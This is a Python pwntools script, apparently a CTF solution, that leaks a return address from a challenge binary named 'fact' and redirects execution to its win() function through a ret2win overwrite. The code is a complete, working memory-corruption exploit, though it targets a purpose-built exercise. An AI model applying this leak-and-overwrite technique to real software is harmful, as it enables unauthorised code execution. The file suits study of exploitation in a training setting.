#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Professional CTF Exploit Script
Leads the return address of a fact function (square_root, multiplication, xor)
back to win() via ret2win.
"""

import argparse
import time
from pwn import remote, process

# ──────────────── Configuration ────────────────
CONFIG = {
    'BINARY': './fact',       # Local binary for process exploitation
    'HOST': '127.0.0.1',      # Remote host for --remote
    'PORT': 9002,             # Remote port
    'BRANCH_OFFSETS': {
        'square_root':      0x1582,  # call square_root_facts → ret-addr 0x1587
        'multiplication':   0x159b,  # call multiplication_facts → ret-addr 0x15a0
        'xor':              0x15b4,  # call xor_facts → ret-addr 0x15b9
    },
    'WIN_OFFSET': 0x169f,     # win() function offset
}
# ────────────────────────────────────────────────

def print_delayed(text, delay=1):
    """Prints the text with a delay."""
    print(text)
    time.sleep(delay)

def print_step(text):
    """Prints a step with a description."""
    print(f"[+] {text}")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Exploit script for fact (CTF challenge) – Leak + ret2win"
    )
    parser.add_argument(
        '--remote', action='store_true',
        help="Connect to remote host instead of local binary"
    )
    parser.add_argument(
        '--branch', choices=CONFIG['BRANCH_OFFSETS'].keys(),
        default='square_root',
        help="Which function to leak and exploit"
    )
    return parser.parse_args()

def exploit(branch_name, remote_mode):
    """
    Executes the exploit:
    1) Leak the return address of the selected fact function
    2) Calculate the absolute address of win()
    3) Perform ret2win with the payload
    """
    # 1) Setup Connection
    if remote_mode:
        conn = remote(CONFIG['HOST'], CONFIG['PORT'])
        print_step(f"Connecting to {CONFIG['HOST']}:{CONFIG['PORT']} (remote)")
    else:
        conn = process(CONFIG['BINARY'])
        print_step(f"Starting local process: {CONFIG['BINARY']}")

    # 2) Interactive name phase (steps a and b)
    conn.sendline(b'test')
    print_step("Sending 'test' to start interaction.")
    conn.sendline(b'b')  # Select b: Do math! → leak
    print_step("Sending 'b' to leak return address...")
    
    # Read until the prompt ", did you", to capture the leak
    data = conn.recvuntil(b', did you')
    print_step("Captured output after calling 'b'. Extracting leak...")

    # Extract the raw bytes between "Exit\n" and ", did you"
    leaked_bytes = data.split(b'Exit\n', 1)[1].split(b', did you', 1)[0]
    leaked_ret = int.from_bytes(leaked_bytes, 'little')

    # Print leak information
    print_step(f"Leaked raw bytes: {leaked_bytes!r}")
    print_step(f"Leaked return address: 0x{leaked_ret:016x}")

    # 3) Calculate the win() address: win_addr = leaked_ret - branch_offset + WIN_OFFSET
    branch_offset = CONFIG['BRANCH_OFFSETS'][branch_name]
    win_addr = leaked_ret - branch_offset + CONFIG['WIN_OFFSET']
    print_step(f"Branch offset ({branch_name}): 0x{branch_offset:x}")
    print_step(f"Calculated win() address: 0x{win_addr:016x}")

    # 4) Send the ret2win payload
    payload = win_addr.to_bytes(8, 'little')
    conn.sendline(b'a')  # Select a: Rename → Here we send the payload instead of a name
    print_step("Sending payload to trigger ret2win...")

    conn.sendline(payload)
    print_step("Payload sent, waiting for win() output...\n")

    # 5) Capture and print the output
    output = conn.clean().decode(errors='ignore')
    print(output)

    # End the connection
    conn.close()

def main():
    args = parse_args()
    print_step(f"Starting the exploit for {args.branch} function.")
    
    # Iterate over all branch offsets for the current run (square_root, multiplication, xor)
    for branch_name in CONFIG['BRANCH_OFFSETS']:
        print_step(f"\n--- Exploiting {branch_name} ---")
        exploit(branch_name, args.remote)

if __name__ == '__main__':
    main()
